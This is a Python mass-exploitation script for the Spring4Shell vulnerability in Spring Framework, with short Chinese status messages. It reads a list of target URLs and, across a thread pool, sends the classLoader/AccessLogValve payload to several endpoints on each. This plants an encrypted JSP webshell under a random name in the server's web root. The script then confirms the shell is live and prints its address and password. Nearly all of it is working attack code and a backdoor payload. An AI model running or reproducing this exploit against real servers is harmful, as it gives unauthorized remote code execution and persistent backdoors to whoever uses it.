#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    :   2022/04/07 11:39:20
# @Author  :   4nth0ny @Friday_lab
# @Version :   1.0

import hashlib
import math
import random
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin,quote

import requests


class ThreadPool:
    def __init__(self, max_thread_num=5):
        self.over = False
        self.results = []

        self.func = None
        self.args_list = None
        self.task_num = 0
        self.max_thread_num = max_thread_num
        self.pool = ThreadPoolExecutor(max_workers=max_thread_num)
        self.cond = threading.Condition()

    def set_tasks(self, func, args_list):
        self.task_num = len(args_list)
        self.args_list = args_list
        self.func = func

    @staticmethod
    def show_process(desc_text, curr, total):
        proc = math.ceil(curr / total * 100)
        show_line = '\r' + desc_text + ':' + '>' * proc \
                    + ' ' * (100 - proc) + '[%s%%]' % proc \
                    + '[%s/%s]' % (curr, total) + '\n'
        sys.stdout.write(show_line)
        sys.stdout.flush()
        time.sleep(0.1)

    def get_result(self, future):
        self.show_process('任务完成进度', self.task_num - len(self.args_list), self.task_num)
        self.results.append(future.result())
        if len(self.args_list):
            args = self.args_list.pop()
            task = self.pool.submit(self.func, *args)
            task.add_done_callback(self.get_result)
        else:
            if self.task_num == len(self.results):
                print('\n', '任务完成')
                self.cond.acquire()
                self.cond.notify()
                self.cond.release()
            return

    def _start_tasks(self):
        for _ in range(self.max_thread_num):
            if len(self.args_list):
                args = self.args_list.pop()
                task = self.pool.submit(self.func, *args)
                task.add_done_callback(self.get_result)
            else:
                break

    def final_results(self):
        self._start_tasks()
        if self.task_num == len(self.results):
            return self.results
        else:
            self.cond.acquire()
            self.cond.wait()
            self.cond.release()
            return self.results

def format_urls(filename):
    fr = open(filename,"r")
    lines = fr.readlines()
    tmps = []

    with open(filename,'w') as fw:
        for line in lines:
            if not line.startswith("http://") and not line.startswith("https://"):
                http = "http://" + line + "\n"
                tmps.append(http)
            else:
                tmps.append(line)
        tmps = [x.strip() for x in tmps if x.strip() != '']
        bs = ['\n']
        tmps = ['{}{}'.format(a,b) for a in tmps for b in bs]
        fw.writelines(tmps)

def web_verify(url):
    requests.packages.urllib3.disable_warnings()
    try:
        response = requests.get(url, verify=False, allow_redirects=True, timeout=10)
        if response.status_code != 200:
            raise requests.RequestException(u"Status code error: {}".format(response.status_code))
        else:
            with open('alive_urls.txt','a+') as fw:
                fw.write(url + "\n")
                print(url + '访问成功,已写入alive_urls.txt')
    except requests.RequestException as e:
        print(url + '无法访问')

def spring_rce(alive_url):
    requests.packages.urllib3.disable_warnings()
    random_str_1 = ''.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'], random.randint(2, 10)))
    random_str_2 = ''.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'], random.randint(2, 10)))
    shell_name = ''.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'], random.randint(8, 15)))
    random_passwd = ''.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'], random.randint(15, 20)))
    # webshell = "%{"+ random_str_2 + "}i if(\"j\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{" + random_str_1 + "}i"

    m = hashlib.md5()
    m.update(random_passwd.encode("utf-8"))
    md5 = m.hexdigest()
    shell_passwd = md5[0:16]

    prefix = "%{" + random_str_2 + "}i"
    suffix = "%{" + random_str_1 + "}i"
    webshell = prefix + "@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"" + suffix + prefix + "!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}" + suffix + prefix + "if (request.getMethod().equals(\"POST\")){String k=\"" + shell_passwd + "\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);}" + suffix

    endpoints = ["index", "login", "add", "uploadFile", "download", ""]
    urls = []

    header = {"User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
                "Connection": "close", "Content-Type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip, deflate",
                random_str_1: "%>",
                random_str_2: "<%"}

    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=" + quote(webshell) + "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2fROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=" + shell_name
    for endpoint in endpoints:
        url = urljoin(alive_url, endpoint)
        urls.append(url)
    for url in urls:
        try:
            a = requests.post(url, headers=header, allow_redirects=True, data=data, verify=False, timeout=10)
            time.sleep(5)
            if a.status_code == 405:
                data = "?" + data
                vuln_url = urljoin(url, data)
                requests.get(vuln_url, headers=header, allow_redirects=True, verify=False, timeout=10)
                data = "?" + "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
                requests.get(urljoin(url, data), headers=header, allow_redirects=True, verify=False, timeout=10)
            else:
                requests.post(url, headers=header, allow_redirects=True, data="class.module.classLoader.resources.context.parent.pipeline.first.pattern=", verify=False, timeout=10)
        except Exception as e:
            print(e)
            print(alive_url + ' 漏洞不存在或无法访问\n')
        try:
            shell_uri = shell_name + ".jsp"
            shell_url = urljoin(alive_url, shell_uri)
            shell = requests.get(shell_url, timeout=15)
            if shell.status_code == 200:
                print(f"漏洞存在，shell地址为:" + shell_url + "\n")
                print(f"shell密码为:" + random_passwd)
                requests.post(url, headers=header, allow_redirects=True, data="class.module.classLoader.resources.context.parent.pipeline.first.pattern=", verify=False, timeout=10)
                break
            else:
                print("shell地址状态码：" + str(shell.status_code))
                print(f"{url}漏洞不存在或端点错误！\n")
        except Exception as e:
            print("漏洞不存在或无法访问\n")
            print(e)

if __name__ == '__main__':
    filename = sys.argv[1]
    format_urls(filename)

    spring_rce_args = []
    with open(filename,'r') as fr:
        alive_urls = fr.readlines()
        for i in alive_urls:
            i = i.replace('\n','')
            spring_rce_args.append((i,))
    if len(spring_rce_args) < 4 or len(spring_rce_args) == 4:
        tp = ThreadPool(len(spring_rce_args))
    else:
        tp = ThreadPool(6)
    tp.set_tasks(spring_rce, spring_rce_args)
    res = tp.final_results()
